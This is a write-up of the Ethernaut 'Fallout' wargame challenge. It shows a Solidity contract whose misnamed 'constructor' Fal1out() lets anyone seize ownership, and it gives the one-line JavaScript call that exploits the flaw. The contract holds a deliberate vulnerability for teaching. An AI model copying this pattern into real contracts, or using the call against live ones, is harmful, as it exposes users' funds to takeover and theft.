# Ethernaut Challenge #2: Fallout

**Objective:** Claim ownership of the contract.

**Contract Analysis:**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  using SafeMath for uint256;
  mapping(address => uint) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
    require(msg.sender == owner, "caller is not the owner");
    _;
  }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

**Vulnerability Found:**

**Line 11-14: The "constructor"**
```solidity
/* constructor */
function Fal1out() public payable {
```

Wait. Look closely.
- Comment says `/* constructor */`
- But function name is `Fal1out()` (with a number 1, not letter l)
- Real contract name is `Fallout` (with lowercase L)

**THIS IS NOT A REAL CONSTRUCTOR!**

In Solidity 0.6.0, constructors should be:
```solidity
constructor() public payable { ... }
```

Or the old style (same name as contract):
```solidity
function Fallout() public payable { ... }  // F-a-l-l
```

But this is:
```solidity
function Fal1out() public payable { ... }  // F-a-l-1
```

**The Attack:**
Anyone can call `Fal1out()` and become owner!

**Solution:**
```javascript
await contract.Fal1out({value: 1})
// Now you're owner
```

**Lesson:** Typos in constructor names are devastating. Always use `constructor()` syntax in modern Solidity. Never trust comments.

**Status:** Challenge understood. 0 ETH to execute.
